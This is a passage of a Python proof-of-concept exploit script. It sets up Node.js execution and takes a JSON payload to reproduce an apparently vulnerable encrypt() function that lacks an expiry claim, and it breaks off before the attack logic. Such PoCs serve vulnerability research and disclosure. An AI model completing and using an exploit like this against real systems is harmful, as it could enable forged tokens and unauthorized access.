def require_node():
    if shutil.which("node") is None:
        sys.exit("[!] Node.js executable not found – required for PoC")


def node_run(js: str, env: dict[str, str]) -> str:
    """Execute JavaScript string with Node (ES modules) and return stdout."""
    proc = subprocess.run(
        ["node", "--input-type=module", "-e", js],
        capture_output=True,
        text=True,
        env=env,
    )
    if proc.returncode != 0:
        raise RuntimeError(f"Node failed:\n{proc.stderr.strip()}")
    return proc.stdout.strip()


def main():
    require_node()

    if len(sys.argv) != 2:
        print("Usage: python exploit.py '<JSON_PAYLOAD>'")
        sys.exit(1)

    payload_raw = sys.argv[1]
    try:
        json.loads(payload_raw)
    except Exception as e:
        sys.exit(f"[!] Provided payload is not valid JSON: {e}")

    secret = "A" * 32  # demo 32-byte secret

    # 1. Reproduce vulnerable encrypt() (no exp claim)
    js_encrypt = textwrap.dedent(
        """
